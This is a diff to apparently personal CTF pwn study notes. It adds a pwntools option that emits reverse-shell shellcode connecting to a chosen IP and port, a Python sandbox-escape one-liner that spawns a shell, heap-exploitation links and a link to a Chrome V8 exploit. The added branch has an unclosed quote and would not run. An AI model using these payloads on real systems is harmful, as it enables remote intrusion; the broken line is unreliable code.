@@ -11,10 +11,14 @@
 from pwn import *
 arch=input("arch? i386/amd64: ")
 context(log_level = 'debug', arch = arch[:-1], os = 'linux')
-choice=input("shell/orw: ")[:-1]
+choice=input("shell/orw/reverse: ")[:-1]
 if choice=="shell":
     shellcode=asm(shellcraft.sh())
     print(shellcode)
+elif choice=="reverse:
+    ip = input("IP: ")[:-1]
+    port=int(input('port: ')[:-1])
+    print(asm(shellcraft.connect(ip, port) + shellcraft.dupsh()))
 else:
     mmap_addr = int(input("hex addr: ")[:-1],16)
     shellcode = shellcraft.open('./flag')
@@ -178,6 +182,16 @@ print(f"ret: {next(libc.search(asm('ret'), executable=True))}")
 ```
 
 8. pwn heap题模板
+
+这里暂时记录一些学习链接，等我有空了会把它们都看一遍然后写个总结（真的会吗？）
+
+- House of Apple
+1. https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/
+2. https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/
+3. https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-3/
+- [house of pig](https://www.anquanke.com/post/id/242640)
+- [House OF Kiwi](https://www.anquanke.com/post/id/235598)
+- [House _OF _Emma](https://www.anquanke.com/post/id/260614)
 
 ### 64位
 
@@ -426,6 +440,7 @@ gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai
   - `[1 for _ in '']+[x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__ == '_wrap_close'][0]['system']('/bin/sh')`
   - `(lambda:__loader__.load_module("os").system("/bin/sh"))()`
   - `(lambda:().__class__.__base__.__subclasses__()[100].__init__.__globals__["__builtins__"]["__import__"]("os").system("/bin/sh"))()`
+  - `__build_class__.__self__.__import__("os").system("sh")`
   - [rattler_read](https://github.com/sigpwny/UIUCTF-2023-Public/tree/main/challenges/pwn/rattler_read)
     - ```py
         """
@@ -1044,3 +1059,4 @@ def csu(rbx, rbp, r12, r13, r14, r15, last):
     - [UTS namespace](https://man7.org/linux/man-pages/man7/uts_namespaces.7.html)
   - cross loopback mount: refers to the process of mounting a loopback device in one mount namespace and making it accessible in another mount namespace.
   - loopback device: In Linux, a loopback device is a virtual device that allows a file to be treated as a block device. It enables files to be mounted as filesystems, just like physical disks or partitions.
+93. Headless Chrome exploit for 73.0.3683.86 (--no-sandbox) V8 version 6.9.0: https://github.com/timwr/CVE-2019-5825/tree/master
